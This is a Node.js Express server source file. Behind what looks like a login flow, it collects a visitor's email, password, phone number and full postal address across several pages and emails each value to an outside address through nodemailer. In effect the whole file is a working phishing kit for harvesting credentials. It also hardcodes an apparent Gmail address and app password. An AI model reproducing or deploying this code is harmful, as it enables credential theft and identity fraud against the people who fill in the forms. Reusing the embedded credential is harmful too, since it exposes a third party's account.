const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Email transporter - Configure with your SMTP settings
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'bhanukiran@gmail.com', // Replace with your email
    pass: 'okkx rhic nhxi vbvi' // Replace with app password
  }
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/login', (req, res) => {
  const email = req.body.email;
  // Send email to admin
  sendEmail('User entered email: ' + email);
  res.redirect('/password');
});

app.get('/password', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'password.html'));
});

app.post('/password', (req, res) => {
  const password = req.body.password;
  // Send email to admin
  sendEmail('User entered password: ' + password);
  res.redirect('/phone');
});

app.get('/phone', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'phone.html'));
});

app.post('/phone', (req, res) => {
  const phone = req.body.phone;
  const email = req.body.email;
  // Send email to admin with email and phone
  sendEmail('User Email: ' + email + '\nPhone: ' + phone);
  res.redirect('/address?email=' + encodeURIComponent(email));
});

app.get('/address', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'address.html'));
});

app.post('/address', (req, res) => {
  const { street, city, state, pincode, country, email } = req.body;
  const address = `${street}, ${city}, ${state} ${pincode}, ${country}`;
  // Send email to admin with full address and email
  sendEmail('User Email: ' + email + '\nAddress: ' + address);
  res.redirect('/success');
});

app.get('/success', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

function sendEmail(message) {
  const mailOptions = {
    from: 'your-email@gmail.com',
    to: 'admin-email@example.com', // Replace with admin email
    subject: 'User Data Submission',
    text: message
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });
}

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});